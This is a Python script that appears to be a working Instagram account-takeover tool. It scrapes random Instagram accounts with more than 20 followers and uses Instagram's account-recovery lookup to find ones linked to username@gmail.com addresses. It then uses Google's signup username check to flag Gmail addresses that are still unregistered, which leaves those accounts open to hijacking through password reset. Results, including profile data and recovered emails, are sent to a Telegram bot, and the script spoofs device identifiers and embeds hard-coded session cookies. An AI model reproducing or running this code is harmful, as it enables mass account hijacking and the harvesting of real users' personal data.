import requests
import uuid
import time
import random
import json
import string
import re
import os
import sys
import base64
import secrets
from datetime import datetime
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

email = None
hits = 0
good = 0
taken = 0
bad = 0
limit = 0
info = {}
session = requests.session()
_session = requests.session()

Y = "\033[1;33m"
W = "\033[1;37m"
LG = "\x1b[38;5;120m"

token = input(f"{LG}Token: {W}")
id = input(f"{LG}Id: {W}")

def UA():
    return f"Instagram {random.randint(100,400)}.0.0.{random.randint(10,99)}.{random.randint(10,999)} Android (25/{random.choice(['7.1.2','8.0.0','9','10','11','12','13'])}; {random.choice(['320dpi','420dpi','450dpi','480dpi','560dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560','2048x2048'])}; Google; {random.choice(['Pixel','Samsung','OnePlus','Xiaomi','Redmi'])}; {random.choice(['sailfish','walleye','marlin','oriole','sunfish'])}; {random.choice(['msm8996','sdm660','exynos8890','mt6768'])}; {random.choice(['en_US','en_GB','hi_IN'])}; {random.randint(100000000,999999999)})"
    
def dis():
    os.system("clear")
    a = f"""{Y}
╔══════════════════════════════╗
  {LG}𝗛𝗜𝗧𝗦 ➜ {W}{hits}
  {LG}𝗚𝗢𝗢𝗗 ➜ {W}{good}
  {LG}𝗧𝗔𝗞𝗘𝗡 ➜ {W}{taken}
  {LG}𝗕𝗔𝗗 ➜ {W}{bad}
  {LG}𝗥𝗔𝗧𝗘 𝗟𝗜𝗠𝗜𝗧 ➜ {W}{limit}
  {LG}𝗘𝗠𝗔𝗜𝗟 ➜ {W}{email}
{Y}╚══════════════════════════════╝
"""
    print(a)

def _tokens():
    global csrf, lsd
    while True:
        try:
            headers = {
                'User-Agent': UA(),
                'x-ig-app-id': "936619743392459",
            }
            response = session.get('https://www.instagram.com/', headers=headers, timeout=20)
            csrf = response.cookies.get('csrftoken', '')
            find = re.search(r'"LSD",\[\],\{"token":"(.*?)"\}', response.text)
            lsd = find.group(1) if find else None
            with open("csrf.txt", "w") as fd:
            	fd.write(f"{csrf}|{lsd}")
        except:
            pass
Thread(target=_tokens, daemon=True).start()

def _load():
    try:
        with open('csrf.txt', 'r') as file:
            parts = file.read().strip().split("|")
            if len(parts) == 2:
                csrf, lsd = parts
                if csrf and lsd:
                    return csrf, lsd
    except Exception:
        pass
    return 'a_NeUPw6QMbv8iODfpVu4P', ''.join(random.choices(string.ascii_letters + string.digits, k=32))

def _tl():
	while True:
		url = "https://accounts.google.com/_/signup/validatepersonaldetails"
		params = {
		  'hl': "en-GB",
		  '_reqid': "175506",
		  'rt': "j"
		}
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': "[\"AEThLlxX_6_JWyBbfSjS4gh-7dfRG0Faq_JYJauTSE18UDIsOOSh4Dfb-6njcSveOB_pxHB4AHaX\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
		  'azt': "AFoagUVc9c_uUJzRK6e32dUB8FxCEfRxWw:1775834837829",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:275",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
		  'x-same-domain': "1",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-arch': "\"\"",
		  'sec-ch-ua-full-version': "\"139.0.7339.0\"",
		  'sec-ch-ua-platform-version': "\"14.0.0\"",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
		  'sec-ch-ua-bitness': "\"\"",
		  'sec-ch-ua-model': "\"SM-A235F\"",
		  'sec-ch-ua-wow64': "?0",
		  'sec-ch-ua-platform': "\"Android\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CKr5ygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "__Secure-BUCKET=CMwC; OTZ=8543056_34_34__34_; AEC=AaJma5sh5Uq_rpZAZjJpsyFnwoQAa6YPSCrR0QvVqOBFIuPIuNiItAkijg; __Host-GAPS=1:ceVBeIFat0cbzvdLBAhni7g-f72sXdKjlI2jPd0jGZtXTjwvNKnGgY25OJx3pD64BDpzIVQdK1Jr9KG4cCpFpQ7wGl94Vw:gK75A7sOf642Bile; SEARCH_SAMESITE=CgQIyaAB; ACCOUNT_CHOOSER=AFx_qI4M-DE-i8uw9Y6c1L1zrzdgEFNNcaNBKBNvPFtQWar0n8lm98sIGfCxG4K-_KxUu8G8hQ1M; NID=530=ZdZHakrMFroO9fLgt3UAT3RVHBXX3u4DwdZiixVDIqd0YxjNKVkh6CtoHUgUiKvL4jLJxdYzbWfsdvzEY2CnBF3jOgfh9vZN0oX9A_r9aZoGwpod5PeOFOBghlPRl_NlO04_NkKxOpefi_x03pl0EdTa6iCMfowhhXB8EVKlFmNMWoQbOIlBbBhRQXq3FuPK0DAqbZLvsTSKWCZgOl3FaYyvSDVTLVeO3p844rZAJRjuy0eD3IxN6Fof18F3r39OCp49P4QGP8gL4ed--GY7lRFouL8Mazj3isVNxNsu6rYV0bHWN2FSehWqYiZ0ugAeeNBNtZygw66aiAmgrs0HgO-PmEd3BHwBdb3hoAOS8W2OBCTgaOnFKa0DpWSirPgJXYW-zE28mMzLPrfFkoISlTVA01GE8evmM95-rgxCCDtxNsRJATvjWNeydvzWSsmthgCx7vUu9a3EA_G3V_-bew"
		}
		response = _session.post(url, params=params, data=payload, headers=headers, timeout=20	)
		tl1 = json.loads(response.text[5:])[0][1][2]
		url = "https://accounts.google.com/_/signup/validatebasicinfo"
		params = {
		  'hl': "en-GB",
		  'TL': tl1,
		  '_reqid': "475506",
		  'rt': "j"
		}
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': "[\"TL:"+ tl1 +"\",2015,3,5,2,null,null,0,null,null,0,0]",
		  'azt': "AFoagUVc9c_uUJzRK6e32dUB8FxCEfRxWw:1775834837829",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:275",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
		  'x-same-domain': "1",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-arch': "\"\"",
		  'sec-ch-ua-full-version': "\"139.0.7339.0\"",
		  'sec-ch-ua-platform-version': "\"14.0.0\"",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
		  'sec-ch-ua-bitness': "\"\"",
		  'sec-ch-ua-model': "\"SM-A235F\"",
		  'sec-ch-ua-wow64': "?0",
		  'sec-ch-ua-platform': "\"Android\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CKr5ygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl1,
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "__Secure-BUCKET=CMwC; OTZ=8543056_34_34__34_; AEC=AaJma5sh5Uq_rpZAZjJpsyFnwoQAa6YPSCrR0QvVqOBFIuPIuNiItAkijg; __Host-GAPS=1:ceVBeIFat0cbzvdLBAhni7g-f72sXdKjlI2jPd0jGZtXTjwvNKnGgY25OJx3pD64BDpzIVQdK1Jr9KG4cCpFpQ7wGl94Vw:gK75A7sOf642Bile; SEARCH_SAMESITE=CgQIyaAB; ACCOUNT_CHOOSER=AFx_qI4M-DE-i8uw9Y6c1L1zrzdgEFNNcaNBKBNvPFtQWar0n8lm98sIGfCxG4K-_KxUu8G8hQ1M; NID=530=ZdZHakrMFroO9fLgt3UAT3RVHBXX3u4DwdZiixVDIqd0YxjNKVkh6CtoHUgUiKvL4jLJxdYzbWfsdvzEY2CnBF3jOgfh9vZN0oX9A_r9aZoGwpod5PeOFOBghlPRl_NlO04_NkKxOpefi_x03pl0EdTa6iCMfowhhXB8EVKlFmNMWoQbOIlBbBhRQXq3FuPK0DAqbZLvsTSKWCZgOl3FaYyvSDVTLVeO3p844rZAJRjuy0eD3IxN6Fof18F3r39OCp49P4QGP8gL4ed--GY7lRFouL8Mazj3isVNxNsu6rYV0bHWN2FSehWqYiZ0ugAeeNBNtZygw66aiAmgrs0HgO-PmEd3BHwBdb3hoAOS8W2OBCTgaOnFKa0DpWSirPgJXYW-zE28mMzLPrfFkoISlTVA01GE8evmM95-rgxCCDtxNsRJATvjWNeydvzWSsmthgCx7vUu9a3EA_G3V_-bew"
		}
		response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
		tl2 = json.loads(response.text[5:])[0][0][4].split("TL:")[1]
		with open("tl.txt", "w") as ok:
			ok.write(tl2)
Thread(target=_tl, daemon=True).start()

def _reset(email):
	global bad, good
	url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
	device = str(uuid.uuid4())
	family = str(uuid.uuid4())
	android = "android-" + secrets.token_hex(8)
	payload = {
	  'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ str(uuid.uuid4()) +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
	  'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
	  'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
	}
	headers = {
	  'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
	  'accept-language': "en-IN, en-US",
	  'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
	  'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
	  'x-ig-android-id': android,
	  'x-ig-app-id': "567067343352427",
	  'x-ig-app-locale': "en_IN",
	  'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
	  'x-ig-device-id': device,
	  'x-ig-family-device-id': family,
	  'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
	  'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
	  'x-pigeon-rawclienttime': str(time.time()),
	  'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
	}
	response = requests.post(url, data=payload, headers=headers, timeout=20)
	if f"{email}" in response.text:
		good+=1
		dis()
		_check(email)
	elif 'Sorry, something' in response.text:
		limit+=1
		dis()
	else:
		bad+=1
		dis()

def _check(email):
	global hits, taken
	usr = email.split("@")[0]
	with open("tl.txt", "r") as ys:
		tl = ys.read().strip()
	url = "https://accounts.google.com/_/signup/usernameavailability"
	params = {
	  'hl': "en-GB",
	  'TL': tl,
	  '_reqid': "675506",
	  'rt': "j"
	}
	payload = {
	  'continue': "https://accounts.google.com/ManageAccount?nc=1",
	  'f.req': "[\"TL:"+ tl +"\",\""+ usr +"\",0,0,1,null,1,321862]",
	  'azt': "AFoagUVc9c_uUJzRK6e32dUB8FxCEfRxWw:1775834837829",
	  'cookiesDisabled': "false",
	  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
	  'gmscoreversion': "null",
	  'flowName': "GlifWebSignIn",
	  'checkConnection': "youtube:275",
	  'checkedDomains': "youtube",
	  'pstMsg': "1",
	  '': ""
	}
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-same-domain': "1",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-arch': "\"\"",
	  'sec-ch-ua-full-version': "\"139.0.7339.0\"",
	  'sec-ch-ua-platform-version': "\"14.0.0\"",
	  'google-accounts-xsrf': "1",
	  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
	  'sec-ch-ua-bitness': "\"\"",
	  'sec-ch-ua-model': "\"SM-A235F\"",
	  'sec-ch-ua-wow64': "?0",
	  'sec-ch-ua-platform': "\"Android\"",
	  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
	  'origin': "https://accounts.google.com",
	  'x-client-data': "CKr5ygE=",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl,
	  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
	  'Cookie': "__Secure-BUCKET=CMwC; OTZ=8543056_34_34__34_; AEC=AaJma5sh5Uq_rpZAZjJpsyFnwoQAa6YPSCrR0QvVqOBFIuPIuNiItAkijg; __Host-GAPS=1:ceVBeIFat0cbzvdLBAhni7g-f72sXdKjlI2jPd0jGZtXTjwvNKnGgY25OJx3pD64BDpzIVQdK1Jr9KG4cCpFpQ7wGl94Vw:gK75A7sOf642Bile; SEARCH_SAMESITE=CgQIyaAB; ACCOUNT_CHOOSER=AFx_qI4M-DE-i8uw9Y6c1L1zrzdgEFNNcaNBKBNvPFtQWar0n8lm98sIGfCxG4K-_KxUu8G8hQ1M; NID=530=ZdZHakrMFroO9fLgt3UAT3RVHBXX3u4DwdZiixVDIqd0YxjNKVkh6CtoHUgUiKvL4jLJxdYzbWfsdvzEY2CnBF3jOgfh9vZN0oX9A_r9aZoGwpod5PeOFOBghlPRl_NlO04_NkKxOpefi_x03pl0EdTa6iCMfowhhXB8EVKlFmNMWoQbOIlBbBhRQXq3FuPK0DAqbZLvsTSKWCZgOl3FaYyvSDVTLVeO3p844rZAJRjuy0eD3IxN6Fof18F3r39OCp49P4QGP8gL4ed--GY7lRFouL8Mazj3isVNxNsu6rYV0bHWN2FSehWqYiZ0ugAeeNBNtZygw66aiAmgrs0HgO-PmEd3BHwBdb3hoAOS8W2OBCTgaOnFKa0DpWSirPgJXYW-zE28mMzLPrfFkoISlTVA01GE8evmM95-rgxCCDtxNsRJATvjWNeydvzWSsmthgCx7vUu9a3EA_G3V_-bew"
	}
	response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
	if '"gf.uar",1' in response.text:
		hits+=1
		dis()
		gmail = _mail(usr)
		_send(token, id, gmail, usr, email)
	else:
		taken+=1
		dis()
		
def _mail(query):
	url = "https://www.instagram.com/api/graphql"
	payload = {
	  'av': "0",
	  '__d': "www",
	  '__user': "0",
	  '__a': "1",
	  '__req': "m",
	  '__hs': "20559.HYP:instagram_web_pkg.2.1...0",
	  'dpr': "3",
	  '__ccg': "GOOD",
	  '__rev': "1037474223",
	  '__s': "69xtbb:57pqmb:p793b1",
	  '__hsi': "7629310293526472042",
	  '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
	  '__csr': "n7inkrNr3L3BihYDAtilph4rifqb9kVZ9p4HDxmFuEFAFaAvkKQhFaLV96jGJbQNkWlsyihkjpqiWTOCclqiaydOjTHQV5UyBmWkJJ5jUhx6DUSFpWWlBKu4VSFojHWnQfU9qm8CU898lUghoSE8op-axaUyUiy88ogxCdG4Wx6m5EixySbyoqwBxu5o5y0bWw3Bo3dwyDTkSjei00lgO3uii08_a0je2a68fo2bw3iOw2Yo5q5E0qcw3Sh0HwEgaUuQ0m2vo1mQ5o1RU2AwSU74U6i9yJ1B0WoswiE1JU0WW480fc8060y",
	  '__hsdp': "goA0zwkkye9pFqauqkI88OYkAeyE8BU2pg2owiUarxJ8EKQE_gdxOxsUeEB3Ci1eceg08do0uhw2Q40p61lw1aa5E",
	  '__hblp': "05Z-0CE2ow_yU560xU4eu18xW6oqwg8nxC15wr8e85-3i1xxC1Qw27oeE0Ja09rw2eEaUtw7cWo24wlUf82SxK5o2uws80yS1lw2jU11U9o198mxi3u5U2Awbq",
	  '__sjsp': "goA0zwkkye9pFqauqkI89QLb8AeyE8_w4PwiUarxJ8EKQE_gdxOxsUeEB3Ci1eceg",
	  '__comet_req': "7",
	  'lsd': "AdTJ7wTIMmb3YP_Es7VsRqEhWXo",
	  'jazoest': "22347",
	  '__spin_r': "1037474223",
	  '__spin_b': "trunk",
	  '__spin_t': "1776337226",
	  '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
	  'qpl_active_flow_ids': "516759801",
	  'fb_api_caller_class': "RelayModern",
	  'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
	  'server_timestamps': "true",
	  'variables': "{\"params\":{\"event_request_id\":\"0b07511d-476d-4b4c-ae3a-45fd805ad854\",\"next_uri\":\"\",\"search_query\":\""+ query +"\",\"waterfall_id\":\"005e7dbf-c78a-4908-9083-3803b1d3f42d\"}}",
	  'doc_id': "26178667145161478",
	  'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
	}
	headers = {
	  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-model': "\"\"",
	  'x-ig-app-id': "936619743392459",
	  'sec-ch-ua-mobile': "?0",
	  'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
	  'x-fb-lsd': "AdTJ7wTIMmb3YP_Es7VsRqEhWXo",
	  'sec-ch-ua-platform-version': "\"\"",
	  'x-asbd-id': "359341",
	  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
	  'sec-ch-prefers-color-scheme': "dark",
	  'x-csrftoken': "bKPOnxXALzrHjjhgVUSXUWvsJSheI52L",
	  'sec-ch-ua-platform': "\"Linux\"",
	  'origin': "https://www.instagram.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.instagram.com/accounts/password/reset/",
	  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
	  'Cookie': "datr=N8-qacv2GfIwdA8nKYODJ03a; ig_did=CF4EB49B-2DE0-49C5-B358-6B71B7793D06; mid=aarPOQAEAAGKchdotUBpy5AbIclH; ig_nrcb=1; ps_l=1; ps_n=1; rur=\"HIL\\0545636887483\\0541807873223:01fe3f5bbc1220e0674754bce6873ff6ade2dc7787b679d5c2ac93b1dd18d6aba48861f6\"; csrftoken=bKPOnxXALzrHjjhgVUSXUWvsJSheI52L; wd=774x749"
	}
	response = requests.post(url, data=payload, headers=headers, timeout=20)
	email = next((i["contact_point"] for i in response.json() ["data"]["caa_ar_ig_account_search"]["contact_points"] if i["type"] == "EMAIL"), None)
	if email:
		return email
	else:
		return None

def _send(token, id, gmail, usr, email):
		username = usr
		data = info.get(username, {})
		business = data.get('is_business', None)
		followers = data.get('follower_count', None)
		followings = data.get('following_count', None)
		posts = data.get('media_count', None) or 0
		private = data.get('is_private', None)
		name = data.get('full_name', None)
		biography = data.get('biography', None)
		business = business if business is not None else 'None'
		followers = followers if followers is not None else 'None'
		followings = followings if followings is not None else 'None'
		private = private if private is not None else 'None'
		name = name if name is not None else 'None'
		biography = biography if biography is not None else 'None'
		if gmail:
			mail = gmail
		else:
			mail = 'None'
		if posts > 2:
			meta = 'True'
		else:
			meta = 'False'
		try:
			content = f"""
╔═════════════════════════╗
  𝗕𝗨𝗦𝗜𝗡𝗘𝗦𝗦 ➜ {business}
  𝗠𝗘𝗧𝗔 ➜ {meta}
  𝗡𝗔𝗠𝗘 ➜ {name}
  𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 ➜ @{username}
  𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 ➜ {followers}
  𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 ➜ {followings}
  𝗣𝗢𝗦𝗧𝗦 ➜ {posts}
  𝗕𝗜𝗢 ➜ {biography}
  𝗚𝗠𝗔𝗜𝗟 ➜ {email}
  𝗔𝗧𝗧𝗔𝗖𝗛𝗘𝗗 𝗠𝗔𝗜𝗟 ➜ {mail}
  𝗨𝗥𝗟 ➜ https://www.instagram.com/{username}
  
  𝗧𝗢𝗢𝗟 ➜ @ceveity
╚═════════════════════════╝
"""
			response = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={content}", timeout=20)
		except:
			with open('HitsZ.txt', 'a') as a:
				a.write(f'{content}\n')

def users():
    global email
    while True:
        csrf, lsd = _load()
        cookies = {
            'rur': '"HIL\\0545636887483\\0541807071850:01fe8123393d804e894598313ace5310cccf24a15f4f219ea4e2a73424529c30f51eb908"'
        }
        headers = {
            'User-Agent': UA(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': lsd,
            'sec-ch-prefers-color-scheme': 'light',
            'x-csrftoken': csrf,
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        payload = {
            'lsd': lsd,
            'variables': json.dumps({"userID": random.randint(2500000000, 21254029834), "username": "cristiano"}),
            'doc_id': '7717269488336001',
        }
        response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=payload, cookies=cookies, timeout=20)
        try:
            username = response.json().get('data', {}).get('user', {}).get('username', {})
            followers = response.json().get('data', {}).get('user', {}).get('follower_count', {})
            id = response.json().get('data', {}).get('user', {}).get('pk', {})
            if username and id and followers and followers > 20:
                info[username] = response.json().get('data', {}).get('user', {})
                email = username + '@gmail.com'
                _reset(email)
        except:
            pass
with ThreadPoolExecutor(max_workers=100) as executor:
    for _ in range(200):
        executor.submit(users)
